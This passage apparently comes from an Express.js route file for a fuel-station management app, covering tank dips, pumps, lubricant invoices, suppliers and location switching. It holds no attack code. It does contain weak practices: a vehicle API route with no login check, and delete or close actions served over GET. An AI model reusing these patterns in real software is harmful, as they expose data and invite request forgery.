    deadlineController.getDeadlineData(req, res, next);  // response returned inside controller
});

app.post('/deadline', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    deadlineController.saveDeadlineData(req, res, next)
});

app.put('/deadline/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
    deadlineController.updateDeadlineData(req, res);

});

// Add these routes with your other route definitions
app.get('/tank-dip', isLoginEnsured, function(req, res, next) {
    tankDipController.getTankDipEntry(req, res, next);
});

app.post('/tank-dip', isLoginEnsured, function(req, res, next) {
    tankDipController.saveTankDipData(req, res, next);
});

app.delete('/tank-dip', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    tankDipController.deleteTankDip(req, res, next);
});

// app.get('/tank-dip/search', isLoginEnsured, function(req, res, next) {
//     tankDipController.searchDips(req, res, next);
// });

app.get('/tank-dip/validate', isLoginEnsured, function(req, res) {
    tankDipController.validateDip(req, res);
});

// Tank Dip Search Page
app.get('/tank-dip/search', [isLoginEnsured], tankDipController.searchDipPage);

// Tank Dip Search Results
app.post('/tank-dip/search', [isLoginEnsured], tankDipController.searchDipResults)


app.post('/pumps', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    pumpController.savePump(req, res, next);
});

app.put('/pumps/:id', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    console.log('User attempting pump update:', req.user);
    pumpController.updatePump(req, res, next);
});

app.get('/pump-master', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    pumpController.getPumpMaster(req, res, next);
});

app.put('/pumps/:id/deactivate', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    pumpController.deactivatePump(req, res, next);
});

app.post('/pump-tanks', [isLoginEnsured, security.isAdmin()], function(req, res, next) {
    pumpController.savePumpTank(req, res, next);
});

app.get('/pump-tanks/validate', [isLoginEnsured, security.isAdmin()], function(req, res) {
    pumpController.validatePumpTank(req, res);
});




// Lubes Invoice routes
app.get('/lubes-invoice-home', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getLubesInvoiceHome(req, res, next);
});

app.get('/lubes-invoice/new', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.createNewInvoice(req, res, next);
});

app.get('/lubes-invoice', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getLubesInvoiceEntry(req, res, next);
});

app.post('/lubes-invoice/save', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.saveLubesInvoice(req, res, next);
});

app.get('/lubes-invoice/delete', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.deleteLubesInvoice(req, res, next);
});

app.get('/lubes-invoice/close', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.finishInvoice(req, res, next);
});

app.get('/lubes-invoice/lines', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getLubesInvoiceLines(req, res, next);
});

app.get('/lubes-invoice/historical-data', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getHistoricalData(req, res, next);
});

// Get suppliers with effective dates for client-side filtering
app.get('/lubes-invoice/suppliers-with-dates', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getSuppliersWithDates(req, res, next);
});

// Get suppliers active on a specific date (alternative server-side approach)
app.get('/lubes-invoice/suppliers-active-on-date', isLoginEnsured, function(req, res, next) {
    lubesInvoiceController.getSuppliersActiveOnDate(req, res, next);
});


// Get suppliers list
app.get('/suppliers', [isLoginEnsured, security.isAdmin()], function (req, res) {
    supplierController.findSuppliers(req.user.location_code).then(data => {
        res.render('suppliers', { 
            title: 'Suppliers', 
            user: req.user, 
            suppliers: data 
        });
    }).catch(err => {
        console.error('Error fetching suppliers:', err);
        res.status(500).render('error', { 
            message: 'Error fetching suppliers' 
        });
    });
});

// Create new supplier
app.post('/suppliers', [isLoginEnsured, security.isAdmin()], function (req, res) {
    const newSupplier = dbMapping.newSupplier(req);
    
    SupplierDao.findSupplierByName(newSupplier.supplier_name, newSupplier.location_code).then(
        (data) => {
            if (data && data.length > 0) {
                supplierController.findSuppliers(newSupplier.location_code).then((data) => {
                    res.status(400).render('suppliers', {
                        title: 'Suppliers',
                        user: req.user,
                        suppliers: data,
                        messages: { warning: msg.WARN_SUPPLIER_DUPLICATE }
                    });
                });
            } else {
                SupplierDao.create(newSupplier).then(() => {
                    res.redirect('/suppliers');
                }).catch(err => {
                    console.error('Error creating supplier:', err);
                    res.status(500).render('error', { 
                        message: 'Error creating supplier' 
                    });
                });
            }
        }
    ).catch(err => {
        console.error('Error checking supplier existence:', err);
        res.status(500).render('error', { 
            message: 'Error processing supplier creation' 
        });
    });
});

// Enable/disable supplier routes
app.post('/suppliers/disable/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
    SupplierDao.disableSupplier(req.params.id, req.user.username)
        .then(() => {
            res.json({ success: true });
        })
        .catch(err => {
            console.error('Error disabling supplier:', err);
            res.status(500).json({ 
                success: false, 
                message: 'Error disabling supplier' 
            });
        });
});

app.post('/suppliers/enable/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
    SupplierDao.enableSupplier(req.params.id, req.user.username)
        .then(() => {
            res.json({ success: true });
        })
        .catch(err => {
            console.error('Error enabling supplier:', err);
            res.status(500).json({ 
                success: false, 
                message: 'Error enabling supplier' 
            });
        });
});

// View disabled suppliers
app.get('/enable-supplier', [isLoginEnsured, security.isAdmin()], function (req, res) {
    supplierController.findDisabledSuppliers(req.user.location_code).then(data => {
        res.render('enable-supplier', { 
            title: 'Enable Supplier', 
            user: req.user, 
            suppliers: data 
        });
    }).catch(err => {
        console.error('Error fetching disabled suppliers:', err);
        res.status(500).render('error', { 
            message: 'Error fetching disabled suppliers' 
        });
    });
});

app.get('/api/vehicles/:creditListId', HomeController.getVehiclesByCreditId);




app.get('/select-location', isLoginEnsured, async function (req, res) {
    try {
        const personId = req.user.Person_id;
        
        // SuperUsers always get access to all locations (backward compatibility)
        if (req.user.Role === 'SuperUser') {
            const availableLocations = await LocationDao.findActiveLocations();
            return res.render('select-location', {
                title: 'Select Location',
                locations: availableLocations,
                selectedLocation: req.user.location_code,
                isSuperUser: true
            });
        }
        
        // For non-SuperUsers, check their accessible locations
        const userLocations = await PersonDao.getUserAccessibleLocationsWithNames(personId);
        
        // If user has only one location, redirect to home
        if (userLocations.length <= 1) {
            return res.redirect('/home');
        }
        
        // Regular users see only their accessible locations
        const availableLocations = userLocations.map(loc => ({
            location_code: loc.location_code,
            location_name: loc.location_name,
            role: loc.role,
            access_type: loc.access_type,
            source: loc.source
        }));

        // Render the select-location view with the available locations
        res.render('select-location', {
            title: 'Select Location',
            locations: availableLocations,
            selectedLocation: req.user.location_code,
            userLocations: userLocations,
            isSuperUser: false
        });
    } catch (error) {
        console.error("Error fetching user locations:", error);
        res.status(500).send("An error occurred while fetching locations.");
    }
});

app.post('/select-location', isLoginEnsured, async function (req, res) {
    try {
        const personId = req.user.Person_id;
        const selectedLocationCode = req.body.location;
        
        // Verify user has access to the selected location
        const userLocations = await PersonDao.getUserAccessibleLocationsWithNames(personId);
        const hasAccess = userLocations.some(loc => loc.location_code === selectedLocationCode) || 
                         req.user.Role === 'SuperUser';
        
        if (!hasAccess) {
            return res.status(403).send("You don't have access to this location.");
        }
        
        // Find the role for this location
        let newRole = req.user.Role; // Default to current role
        if (req.user.Role !== 'SuperUser') {
            const locationAccess = userLocations.find(loc => loc.location_code === selectedLocationCode);
            if (locationAccess) {
                newRole = locationAccess.role;
            }
        }
        
        // Update user session with new location and role
        req.user.location_code = selectedLocationCode;
        req.user.Role = newRole;
        req.session.selectedLocation = selectedLocationCode;
        req.session.selectedRole = newRole;

        // Clear any cached menu data so it gets refreshed for new location/role
        if (process.env.NODE_ENV === 'development' && process.env.SKIP_LOGIN === 'true') {
            req.session.menuCacheCleared = true; // Signal to bypass to refresh menus
        }

        console.log(`User ${req.user.User_Name} switched to location ${selectedLocationCode} with role ${newRole}`);

        // Redirect to home or dashboard after selecting the location
        res.redirect('/home');
    } catch (error) {
        console.error("Error processing location selection:", error);
        res.status(500).send("An error occurred while processing your request.");
    }
});

// error handler - start.
app.use(function (req, res, next) {
    next(createError(403));
});

app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});
// error handler - end.

// port - start

app.listen(process.env.SERVER_PORT, function () {
    console.log('Express server listening on port ' + process.env.SERVER_PORT);
});

getBrowser().then(() => console.log('Browser is ready for use.')); // used for PDF Generation.





// port - end
module.exports = app;
// app configurations - end
